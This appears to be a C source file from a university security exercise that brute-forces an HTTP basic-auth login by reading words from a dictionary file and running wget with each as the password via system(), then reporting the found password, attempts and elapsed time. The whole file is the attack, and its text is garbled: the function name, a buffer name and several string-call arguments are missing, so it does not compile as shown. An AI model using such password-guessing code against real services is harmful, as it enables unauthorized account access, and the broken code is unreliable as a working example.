#include "stdio.h"
#include "string.h"


#include "stdlib.h"
()
{
FILE *pfile;
int i,t,tt,num,not;
char str[255];
char [4];
char url[400];
if ((pfile = fopen("./words", "r")) == NULL)
           fprintf(stderr, "Cannot open %s\n", "output_file");

tt=time(&(t));
not=0;	   
while (!feof(pfile))
{
strcpy(str,"");
fgets(str,80,pfile);
if (strlen(str)<=4)
{
	
			strcpy(,str);
		        strcpy(url,"wget http://sec-crack.cs.rmit.edu./SEC/2/index.php");
			
			strcat(url," --http-user= --http-passwd=");
			strcat(url,); 
			
		    	num=system(url);
			not++;
			if (num==0)
			
			{
				printf("The actual password is :%s\n",);
				time(&(t));
				tt=t-tt;
				printf("The number of attempts  crack the passssword by dictionary method is :%d\n",not);
				printf("The time_var taken  find the password by dictionary method is :%d seconds\n",tt);
				exit(1);
				
			}
						
			else
			{
			strcpy(,"");
			}
	
		
}


}


}
